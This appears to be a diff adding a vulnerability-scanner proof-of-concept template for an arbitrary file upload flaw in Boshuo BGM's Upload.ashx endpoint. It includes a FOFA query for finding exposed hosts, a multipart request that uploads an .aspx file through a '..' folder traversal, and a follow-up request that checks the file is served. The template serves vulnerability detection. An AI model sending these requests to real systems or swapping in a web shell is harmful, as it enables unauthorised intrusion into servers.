@@ -1,0 +1,74 @@
+id: poc-yaml-bosure-bgm-upload-ashx-anyfile-upload
+info:
+  name: 博硕BGM Upload.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 博硕BGM
+  fofa: body="Libs/Platform.lib"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /WebUpload/server/Upload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1234567890
+  data: '------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="id"
+
+
+    WU_FILE_0
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="name"
+
+
+    {{.t1}}.aspx
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="size"
+
+
+    10000
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="type"
+
+
+    image/jpeg
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="OwnBaseFolder"
+
+
+    ..
+
+    ------WebKitFormBoundary1234567890
+
+    Content-Disposition: form-data; name="file"; filename="1.jpg"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundary1234567890--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"FileName\"") &&
+
+    contains(body,".aspx")
+
+    '
+  output:
+  - regex_match(body,"Others/(?P<file>.*?).aspx")
+- method: GET
+  path: /WebUpload/Upload/../Others/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
